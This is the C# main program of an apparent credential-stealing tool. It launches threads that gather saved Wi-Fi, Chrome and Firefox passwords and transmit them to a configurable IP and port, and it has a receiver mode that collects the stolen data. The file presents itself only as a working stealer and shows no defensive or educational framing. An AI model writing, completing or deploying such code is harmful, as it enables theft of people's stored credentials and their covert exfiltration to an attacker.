using System;
using System.Threading;
using CommandLine;
using PS03.CommandLineOptions;
using PS03.Network.Receive;
using PS03.PasswordOps;

namespace PS03
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            var options = new Options();
            options.HandleArgs(args);
          

            // If the receiver is set, we should not run operations
            if (!options.Receive)
            {
                var wifi = new GetWifi(options.Ip,options.Port,options.Transmit,options.Verbose);
                var chrome = new GetChrome(options.Ip, options.Port, options.Transmit, options.Verbose);
                var firefox = new GetFirefox(options.Ip, options.Port, options.Transmit, options.Verbose);

                var T_WIFI = new Thread(wifi.Execute);
                var T_CHROME = new Thread(chrome.Execute);
                var T_FIREFOX = new Thread(firefox.Execute);


                T_WIFI.Start();
                T_CHROME.Start();
                T_FIREFOX.Start();

                T_WIFI.Join();
                T_CHROME.Join();
                T_FIREFOX.Join();
            }
            if (options.Receive)
            {
                if (options.Transmit)
                {
                    //Can't do both.
                    Console.WriteLine("Error: Can't transmit and receive on same instance");
                    Environment.Exit(0);
                }
                var receiver = new Receiver();
                receiver.Run(options.Port);
            }
        }
    }
}